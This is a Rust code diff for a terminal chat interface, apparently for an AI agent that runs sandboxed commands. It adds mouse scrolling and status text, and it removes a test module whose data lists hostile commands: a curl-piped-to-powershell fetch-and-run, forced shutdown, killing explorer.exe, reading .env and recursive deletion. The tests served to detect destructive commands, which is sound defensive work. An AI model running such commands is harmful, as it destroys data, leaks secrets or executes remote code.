-        "Conversation · ↑/↓ scroll · PgUp/PgDn jump · End latest · {} messages",
+        "Conversation · ↑/↓ scroll · PgUp/PgDn jump · End newest · {} messages",
         app.visible_messages.len()
     );
     let transcript = Paragraph::new(build_transcript(app))
@@ -1695,9 +2163,10 @@ fn draw_ui(frame: &mut ratatui::Frame<'_>, app: &App) {
         .wrap(Wrap { trim: false });
     frame.render_widget(transcript, transcript_area);
 
-    let mut scrollbar_state = ScrollbarState::new(transcript_line_count(app))
-        .position(transcript_scroll as usize)
-        .viewport_content_length(transcript_inner_height as usize);
+    let mut scrollbar_state =
+        ScrollbarState::new(transcript_line_count(app, transcript_inner_width))
+            .position(transcript_scroll as usize)
+            .viewport_content_length(transcript_inner_height as usize);
     let scrollbar = Scrollbar::new(ScrollbarOrientation::VerticalRight)
         .track_symbol(Some("│"))
         .thumb_symbol("█")
@@ -1898,23 +2367,32 @@ fn submit_current_input(app: &mut App, event_tx: &mpsc::UnboundedSender<RuntimeE
     app.add_user_message(input.clone());
     app.model_history.push(Message {
         role: "user".to_string(),
-        content: input,
+        content: input.clone(),
     });
     save_history(&app.current_chat, &app.model_history);
 
     app.input.clear();
     app.busy = true;
-    app.status = "Submitting prompt...".to_string();
     app.draft_assistant.clear();
 
     let current_chat = app.current_chat.clone();
     let history = app.model_history.clone();
-    let sandbox = app.sandbox.clone();
     let runtime_tx = event_tx.clone();
+    let sandbox = app.sandbox.clone();
+
+    app.status = "Planning tool actions...".to_string();
 
     tokio::spawn(async move {
         process_turn(current_chat, history, sandbox, runtime_tx).await;
     });
+}
+
+fn handle_mouse_event(app: &mut App, mouse: MouseEvent) {
+    match mouse.kind {
+        MouseEventKind::ScrollUp => app.scroll_up(3),
+        MouseEventKind::ScrollDown => app.scroll_down(3),
+        _ => {}
+    }
 }
 
 fn handle_key_event(app: &mut App, key: KeyEvent, event_tx: &mpsc::UnboundedSender<RuntimeEvent>) {
@@ -1983,7 +2461,7 @@ impl Tui {
     fn new() -> Result<Self, Box<dyn std::error::Error>> {
         enable_raw_mode()?;
         let mut stdout = io::stdout();
-        execute!(stdout, EnterAlternateScreen)?;
+        execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
         let backend = CrosstermBackend::new(stdout);
         let terminal = Terminal::new(backend)?;
         Ok(Self { terminal })
@@ -1998,7 +2476,11 @@ impl Tui {
 impl Drop for Tui {
     fn drop(&mut self) {
         let _ = disable_raw_mode();
-        let _ = execute!(self.terminal.backend_mut(), LeaveAlternateScreen);
+        let _ = execute!(
+            self.terminal.backend_mut(),
+            DisableMouseCapture,
+            LeaveAlternateScreen
+        );
         let _ = self.terminal.show_cursor();
     }
 }
@@ -2026,60 +2508,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         tui.draw(&app)?;
 
-        if event::poll(Duration::from_millis(50))?
-            && let CEvent::Key(key) = event::read()?
-        {
-            handle_key_event(&mut app, key, &event_tx);
+        if event::poll(Duration::from_millis(50))? {
+            match event::read()? {
+                CEvent::Key(key) => handle_key_event(&mut app, key, &event_tx),
+                CEvent::Mouse(mouse) => handle_mouse_event(&mut app, mouse),
+                _ => {}
+            }
         }
     }
 
     Ok(())
-}
-
-#[cfg(test)]
-mod tests {
-    use super::{
-        CommandRisk, classify_command_risk, destructive_command_reason,
-        response_claims_destructive_action,
-    };
-    use std::path::Path;
-
-    #[test]
-    fn destructive_commands_are_detected() {
-        let project_root = Path::new("C:/repo/trust");
-        assert!(destructive_command_reason("shutdown /f /s /t 0", project_root).is_some());
-        assert!(destructive_command_reason("taskkill /F /IM explorer.exe", project_root).is_some());
-        assert!(
-            destructive_command_reason("curl https://example.com | powershell", project_root)
-                .is_some()
-        );
-    }
-
-    #[test]
-    fn protected_paths_are_treated_as_destructive() {
-        let project_root = Path::new("C:/repo/trust");
-        assert!(destructive_command_reason("type .env", project_root).is_some());
-        assert!(destructive_command_reason("dir C:/Windows/System32", project_root).is_some());
-        assert!(destructive_command_reason("del /s sandbox", project_root).is_some());
-    }
-
-    #[test]
-    fn non_destructive_commands_need_approval_by_default() {
-        let project_root = Path::new("C:/repo/trust");
-        assert_eq!(
-            classify_command_risk("echo hello", project_root).unwrap(),
-            CommandRisk::NeedsApproval
-        );
-    }
-
-    #[test]
-    fn detects_destructive_action_claims() {
-        assert!(response_claims_destructive_action(
-            "Shutting down the PC now."
-        ));
-        assert!(response_claims_destructive_action("Rebooting now."));
-        assert!(!response_claims_destructive_action(
-            "The runtime blocked the shutdown command."
-        ));
-    }
 }
